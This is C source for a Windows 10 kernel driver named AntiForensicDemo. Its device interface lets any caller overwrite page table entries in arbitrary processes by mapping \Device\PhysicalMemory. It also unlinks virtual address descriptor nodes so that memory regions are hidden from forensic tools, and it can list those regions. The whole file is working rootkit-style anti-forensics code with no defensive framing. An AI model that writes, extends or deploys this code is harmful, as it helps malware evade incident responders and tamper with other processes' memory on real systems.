// AntiForensicDemo.sys
// Target: Windows 10 x64 22H2 (Build 19045)

#include <ntifs.h>
#include <ntddk.h>
#include <intrin.h>

#pragma warning(disable : 4201)
#pragma warning(disable : 4242)

// ---------------------------------------------------------------------------
// Forward Declarations & Intrinsics
// ---------------------------------------------------------------------------

#if defined(_M_X64) || defined(_M_AMD64) || defined(_M_IX86)
extern void __invlpg(void* Address);
#pragma intrinsic(__invlpg)
#endif

// PushLock functions
VOID FASTCALL ExfAcquirePushLockExclusive(PEX_PUSH_LOCK PushLock);
VOID FASTCALL ExfReleasePushLockExclusive(PEX_PUSH_LOCK PushLock);

// ---------------------------------------------------------------------------
// Definitions
// ---------------------------------------------------------------------------

#define DEVICE_NAME L"\\Device\\AntiForensicDemo"
#define LINK_NAME L"\\DosDevices\\AntiForensicDemo"

#define IOCTL_WRITE_PTE     CTL_CODE(0x800, 0x101, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_VAD      CTL_CODE(0x800, 0x200, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_PROBE_REGIONS CTL_CODE(0x800, 0x400, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Hardcoded Offsets for Windows 10 22H2
ULONG g_VadRootOffset = 0x7d8;
ULONG g_WorkingSetLockOffset = 0x7f0; 

typedef struct _PTE_REQUEST {
    ULONG     ProcessId;
    ULONGLONG VirtualAddress;
    ULONGLONG PteValue;
    ULONGLONG OldValue;
    BOOLEAN   Success;
} PTE_REQUEST, * PPTE_REQUEST;

typedef struct _VAD_HIDE_REQUEST {
    ULONG     ProcessId;
    ULONGLONG StartAddress;
    ULONGLONG EndAddress;
} VAD_HIDE_REQUEST, * PVAD_HIDE_REQUEST;

typedef struct _PROBE_REQUEST {
    ULONG ProcessId;
    ULONG RegionCount;
} PROBE_REQUEST, * PPROBE_REQUEST;

typedef struct _MEMORY_REGION {
    ULONGLONG StartAddress;
    ULONGLONG EndAddress;
    ULONG     Protection;
    ULONG     Type;
} MEMORY_REGION, * PMEMORY_REGION;

// ---------------------------------------------------------------------------
// Kernel Structures
// ---------------------------------------------------------------------------

typedef union _CR3 {
    struct {
        ULONG64 Ignored1 : 3;
        ULONG64 PWT : 1;
        ULONG64 PCD : 1;
        ULONG64 Ignored2 : 7;
        ULONG64 Pfn : 36;
        ULONG64 Reserved : 16;
    };
    ULONG64 Value;
} CR3;

typedef union _PT_ENTRY {
    struct {
        ULONG64 Present : 1;
        ULONG64 Rw : 1;
        ULONG64 User : 1;
        ULONG64 Pwt : 1;
        ULONG64 Pcd : 1;
        ULONG64 Accessed : 1;
        ULONG64 Dirty : 1;
        ULONG64 Pat : 1;
        ULONG64 Global : 1;
        ULONG64 Ignored1 : 3;
        ULONG64 Pfn : 36;
        ULONG64 Reserved : 4;
        ULONG64 Ignored2 : 11;
        ULONG64 Xd : 1;
    };
    ULONG64 Value;
} PT_ENTRY;

typedef struct _MMVAD_SHORT {
    RTL_BALANCED_NODE VadNode;
    ULONG StartingVpn;
    ULONG EndingVpn;
    UCHAR StartingVpnHigh;
    UCHAR EndingVpnHigh;
    UCHAR CommitChargeHigh;
    UCHAR SpareNT64VadUChar;
    LONG ReferenceCount;
    PVOID PushLock; 
    ULONG u;
    ULONG u1;
    PVOID EventList;
} MMVAD_SHORT, * PMMVAD_SHORT;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

VOID UnloadDriver(PDRIVER_OBJECT DriverObject);
NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// Safe physical read
NTSTATUS ReadPhysicalAddress(ULONG64 PhysicalAddress, PULONG64 OutValue) {
    MM_COPY_ADDRESS sourceAddress;
    sourceAddress.PhysicalAddress.QuadPart = PhysicalAddress;
    SIZE_T bytesTransferred;
    return MmCopyMemory(OutValue, sourceAddress, sizeof(ULONG64), MM_COPY_MEMORY_PHYSICAL, &bytesTransferred);
}

// Walk Page Tables
NTSTATUS GetPtePhysicalAddress(ULONG64 Cr3Value, ULONG64 VirtualAddress, PULONG64 OutPtePa) {
    ULONG64 pml4Index = (VirtualAddress >> 39) & 0x1FF;
    ULONG64 pdptIndex = (VirtualAddress >> 30) & 0x1FF;
    ULONG64 pdIndex   = (VirtualAddress >> 21) & 0x1FF;
    ULONG64 ptIndex   = (VirtualAddress >> 12) & 0x1FF;

    CR3 cr3;
    cr3.Value = Cr3Value;
    PT_ENTRY entry;
    NTSTATUS status;

    // 1. PML4
    ULONG64 pml4Base = cr3.Pfn << 12;
    status = ReadPhysicalAddress(pml4Base + (pml4Index * sizeof(ULONG64)), &entry.Value);
    if (!NT_SUCCESS(status) || !entry.Present) return STATUS_NOT_FOUND;

    // 2. PDPT
    ULONG64 pdptBase = entry.Pfn << 12;
    status = ReadPhysicalAddress(pdptBase + (pdptIndex * sizeof(ULONG64)), &entry.Value);
    if (!NT_SUCCESS(status) || !entry.Present) return STATUS_NOT_FOUND;
    if (entry.Value & 0x80) return STATUS_INVALID_PAGE_PROTECTION; 

    // 3. PD
    ULONG64 pdBase = entry.Pfn << 12;
    status = ReadPhysicalAddress(pdBase + (pdIndex * sizeof(ULONG64)), &entry.Value);
    if (!NT_SUCCESS(status) || !entry.Present) return STATUS_NOT_FOUND;
    if (entry.Value & 0x80) return STATUS_INVALID_PAGE_PROTECTION; 

    // 4. PT
    ULONG64 ptBase = entry.Pfn << 12;
    *OutPtePa = ptBase + (ptIndex * sizeof(ULONG64));

    return STATUS_SUCCESS;
}

// ---------------------------------------------------------------------------
// SECTION OBJECT MAPPING (Bypasses WinError 5)
// ---------------------------------------------------------------------------
NTSTATUS MapPhysicalViaSection(PHYSICAL_ADDRESS TargetPa, PVOID* OutVa, HANDLE* OutHandle) {
    UNICODE_STRING physMemName;
    OBJECT_ATTRIBUTES objAttrs;
    HANDLE hSection;
    NTSTATUS status;
    PVOID baseAddress = NULL;
    SIZE_T viewSize = PAGE_SIZE;
    LARGE_INTEGER sectionOffset;

    RtlInitUnicodeString(&physMemName, L"\\Device\\PhysicalMemory");
    InitializeObjectAttributes(&objAttrs, &physMemName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwOpenSection(&hSection, SECTION_ALL_ACCESS, &objAttrs);
    if (!NT_SUCCESS(status)) return status;

    sectionOffset.QuadPart = TargetPa.QuadPart;
    status = ZwMapViewOfSection(hSection, ZwCurrentProcess(), &baseAddress, 0, 
                                PAGE_SIZE, &sectionOffset, &viewSize, ViewUnmap, 0, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        ZwClose(hSection);
        return status;
    }

    *OutVa = baseAddress;
    *OutHandle = hSection;
    return STATUS_SUCCESS;
}

VOID UnmapPhysicalViaSection(PVOID BaseAddress, HANDLE hSection) {
    if (BaseAddress) ZwUnmapViewOfSection(ZwCurrentProcess(), BaseAddress);
    if (hSection) ZwClose(hSection);
}

// ---------------------------------------------------------------------------
// VAD Logic (Robust AVL Removal)
// ---------------------------------------------------------------------------

ULONGLONG VadVpnToVa(PMMVAD_SHORT vad, BOOLEAN isStart) {
    if (isStart) return ((ULONGLONG)vad->StartingVpnHigh << 44) | ((ULONGLONG)vad->StartingVpn << 12);
    else return ((ULONGLONG)vad->EndingVpnHigh << 44) | ((ULONGLONG)vad->EndingVpn << 12) | 0xFFF;
}

PMMVAD_SHORT FindVadNode(PRTL_BALANCED_NODE root, ULONGLONG startVa, ULONGLONG endVa) {
    PRTL_BALANCED_NODE current = root;
    while (current != NULL) {
        PMMVAD_SHORT vad = CONTAINING_RECORD(current, MMVAD_SHORT, VadNode);
        ULONGLONG vStart = VadVpnToVa(vad, TRUE);
        ULONGLONG vEnd = VadVpnToVa(vad, FALSE);
        if (startVa >= vStart && endVa <= vEnd) return vad;
        if (startVa < vStart) current = current->Left;
        else current = current->Right;
    }
    return NULL;
}

PRTL_BALANCED_NODE GetParent(PRTL_BALANCED_NODE node) {
    return (PRTL_BALANCED_NODE)(node->ParentValue & ~7);
}

PRTL_BALANCED_NODE FindSuccessor(PRTL_BALANCED_NODE node) {
    PRTL_BALANCED_NODE current = node->Right;
    while (current && current->Left != NULL) current = current->Left;
    return current;
}

VOID SetChild(PRTL_BALANCED_NODE parent, PRTL_BALANCED_NODE oldChild, PRTL_BALANCED_NODE newChild, PRTL_BALANCED_NODE* rootPtr) {
    if (parent == NULL) {
        *rootPtr = newChild;
    } else {
        if (parent->Left == oldChild) parent->Left = newChild;
        else parent->Right = newChild;
    }
    if (newChild != NULL) {
        ULONG_PTR balance = newChild->ParentValue & 7;
        newChild->ParentValue = (ULONG_PTR)parent | balance;
    }
}

VOID RemoveVadNode(PRTL_BALANCED_NODE* rootPtr, PMMVAD_SHORT vadToRemove) {
    PRTL_BALANCED_NODE node = &vadToRemove->VadNode;
    PRTL_BALANCED_NODE parent = GetParent(node);
    
    if (node->Left != NULL && node->Right != NULL) {
        PRTL_BALANCED_NODE successor = FindSuccessor(node);
        PRTL_BALANCED_NODE successorParent = GetParent(successor);
        PRTL_BALANCED_NODE successorRight = successor->Right;

        if (successor != node->Right) {
            SetChild(successorParent, successor, successorRight, rootPtr);
            successor->Right = node->Right;
            if (successor->Right) {
                ULONG_PTR bal = successor->Right->ParentValue & 7;
                successor->Right->ParentValue = (ULONG_PTR)successor | bal;
            }
        }
        successor->Left = node->Left;
        if (successor->Left) {
            ULONG_PTR bal = successor->Left->ParentValue & 7;
            successor->Left->ParentValue = (ULONG_PTR)successor | bal;
        }
        SetChild(parent, node, successor, rootPtr);

        ULONG_PTR nodeBalance = node->ParentValue & 7;
        ULONG_PTR successorNewParentVal = successor->ParentValue & ~7;
        successor->ParentValue = successorNewParentVal | nodeBalance;
    } else {
        PRTL_BALANCED_NODE child = (node->Left != NULL) ? node->Left : node->Right;
        SetChild(parent, node, child, rootPtr);
    }
    node->ParentValue = 0;
    node->Left = NULL;
    node->Right = NULL;
}

VOID WalkVadTreeHelper(PRTL_BALANCED_NODE node, PMEMORY_REGION regions, PULONG count, ULONG max) {
    if (!node || *count >= max) return;
    if (!MmIsAddressValid(node)) return;
    PMMVAD_SHORT vad = CONTAINING_RECORD(node, MMVAD_SHORT, VadNode);
    if (node->Left) WalkVadTreeHelper(node->Left, regions, count, max);
    if (*count < max) {
        regions[*count].StartAddress = VadVpnToVa(vad, TRUE);
        regions[*count].EndAddress = VadVpnToVa(vad, FALSE);
        regions[*count].Type = (vad->u >> 0) & 0xFF; 
        regions[*count].Protection = 0; 
        (*count)++;
    }
    if (node->Right) WalkVadTreeHelper(node->Right, regions, count, max);
}

// ---------------------------------------------------------------------------
// IOCTL Implementations
// ---------------------------------------------------------------------------

NTSTATUS IoctlWritePte(PDEVICE_OBJECT dev, PIRP Irp) {
    // FIX: Added 'dev' parameter to match call signature in DeviceControl
    UNREFERENCED_PARAMETER(dev);
    
    PPTE_REQUEST req = (PPTE_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS proc = NULL;
    KAPC_STATE apc;
    ULONG64 cr3 = 0;

    if (!req) return STATUS_INVALID_PARAMETER;

    status = PsLookupProcessByProcessId(UlongToHandle(req->ProcessId), &proc);
    if (!NT_SUCCESS(status)) return status;

    // 1. Safe Touch (Ignore Errors here to allow Restore when VAD is gone)
    KeStackAttachProcess((PKPROCESS)proc, &apc);
    CHAR tempBuf[8];
    SIZE_T bytesRead = 0;
    MM_COPY_ADDRESS addr;
    addr.VirtualAddress = (PVOID)req->VirtualAddress;
    // We intentionally ignore the return status here. 
    // If VAD is gone, this fails, but we must proceed to restore the PTE.
    MmCopyMemory(tempBuf, addr, 1, MM_COPY_MEMORY_VIRTUAL, &bytesRead);
    
    // 2. Get Real User CR3
    cr3 = *(ULONG64*)((PUCHAR)proc + 0x28); 
    KeUnstackDetachProcess(&apc);

    // 3. Walk Page Tables
    ULONG64 ptePa = 0;
    status = GetPtePhysicalAddress(cr3, req->VirtualAddress, &ptePa);

    if (NT_SUCCESS(status)) {
        // 4. Map via Section
        ULONG64 paAligned = ptePa & ~0xFFFull;
        ULONG64 offset = ptePa & 0xFFFull;
        PHYSICAL_ADDRESS mapPa;
        mapPa.QuadPart = paAligned;

        PVOID mappedBase = NULL;
        HANDLE hSection = NULL;

        status = MapPhysicalViaSection(mapPa, &mappedBase, &hSection);
        
        if (NT_SUCCESS(status) && mappedBase) {
            PULONG64 pPte = (PULONG64)((ULONG64)mappedBase + offset);
            
            req->OldValue = *pPte;
            *pPte = req->PteValue; // WRITE
            
            DbgPrint("AntiForensic: PTE Write. Old: %llx New: %llx\n", req->OldValue, req->PteValue);
            req->Success = TRUE;

            UnmapPhysicalViaSection(mappedBase, hSection);

            // Flush TLB
            KeStackAttachProcess((PKPROCESS)proc, &apc);
            __invlpg((PVOID)req->VirtualAddress);
            KeUnstackDetachProcess(&apc);
        } else {
            DbgPrint("AntiForensic: Section Map Failed. Status: 0x%x\n", status);
        }
    } else {
        DbgPrint("AntiForensic: Walk Failed. Status: 0x%x\n", status);
    }

    ObDereferenceObject(proc);
    Irp->IoStatus.Information = sizeof(PTE_REQUEST);
    return status;
}

NTSTATUS IoctlHideVad(PDEVICE_OBJECT dev, PIRP Irp) {
    UNREFERENCED_PARAMETER(dev);
    PVAD_HIDE_REQUEST req = (PVAD_HIDE_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    PEPROCESS proc;
    NTSTATUS status = STATUS_SUCCESS;
    PEX_PUSH_LOCK workingSetLock = NULL;
    BOOLEAN lockHeld = FALSE;

    if (!req) return STATUS_INVALID_PARAMETER;

    if (!NT_SUCCESS(PsLookupProcessByProcessId(UlongToHandle(req->ProcessId), &proc))) 
        return STATUS_NOT_FOUND;

    if (g_WorkingSetLockOffset != 0) {
        workingSetLock = (PEX_PUSH_LOCK)((PUCHAR)proc + g_WorkingSetLockOffset);
        if (MmIsAddressValid(workingSetLock)) {
            __try {
                ExfAcquirePushLockExclusive(workingSetLock);
                lockHeld = TRUE;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                ObDereferenceObject(proc);
                return STATUS_ACCESS_VIOLATION;
            }
        }
    }

    PRTL_BALANCED_NODE* vadRootPtr = (PRTL_BALANCED_NODE*)((PUCHAR)proc + g_VadRootOffset);
    if (MmIsAddressValid(vadRootPtr) && *vadRootPtr) {
        PMMVAD_SHORT vad = FindVadNode(*vadRootPtr, req->StartAddress, req->EndAddress);
        if (vad) {
            RemoveVadNode(vadRootPtr, vad);
        } else {
            status = STATUS_NOT_FOUND;
        }
    }

    if (lockHeld) ExfReleasePushLockExclusive(workingSetLock);
    ObDereferenceObject(proc);
    Irp->IoStatus.Information = 0;
    return status;
}

NTSTATUS IoctlProbeRegions(PDEVICE_OBJECT dev, PIRP Irp, PIO_STACK_LOCATION stack) {
    UNREFERENCED_PARAMETER(dev);
    PPROBE_REQUEST req = (PPROBE_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    ULONG maxRegions = stack->Parameters.DeviceIoControl.OutputBufferLength / sizeof(MEMORY_REGION);
    PMEMORY_REGION regions = (PMEMORY_REGION)Irp->AssociatedIrp.SystemBuffer;
    PEPROCESS proc;

    if (!NT_SUCCESS(PsLookupProcessByProcessId(UlongToHandle(req->ProcessId), &proc))) 
        return STATUS_NOT_FOUND;

    PRTL_BALANCED_NODE* vadRootPtr = (PRTL_BALANCED_NODE*)((PUCHAR)proc + g_VadRootOffset);
    ULONG count = 0;
    if (MmIsAddressValid(vadRootPtr) && *vadRootPtr != NULL) 
        WalkVadTreeHelper(*vadRootPtr, regions, &count, maxRegions);

    ObDereferenceObject(proc);
    Irp->IoStatus.Information = count * sizeof(MEMORY_REGION);
    return STATUS_SUCCESS;
}

// ---------------------------------------------------------------------------
// Driver Entry
// ---------------------------------------------------------------------------

NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_WRITE_PTE: status = IoctlWritePte(DeviceObject, Irp); break;
        case IOCTL_PROBE_REGIONS: status = IoctlProbeRegions(DeviceObject, Irp, stack); break;
        case IOCTL_HIDE_VAD: status = IoctlHideVad(DeviceObject, Irp); break;
        default: status = STATUS_INVALID_DEVICE_REQUEST; break;
    }
    Irp->IoStatus.Status = status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

VOID UnloadDriver(PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING linkName = RTL_CONSTANT_STRING(LINK_NAME);
    IoDeleteSymbolicLink(&linkName);
    IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    PDEVICE_OBJECT deviceObject;
    UNICODE_STRING devName = RTL_CONSTANT_STRING(DEVICE_NAME);
    UNICODE_STRING linkName = RTL_CONSTANT_STRING(LINK_NAME);
    
    NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) return status;
    if (!NT_SUCCESS(IoCreateSymbolicLink(&linkName, &devName))) { IoDeleteDevice(deviceObject); return STATUS_UNSUCCESSFUL; }
    
    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    DriverObject->DriverUnload = UnloadDriver;
    return STATUS_SUCCESS;
}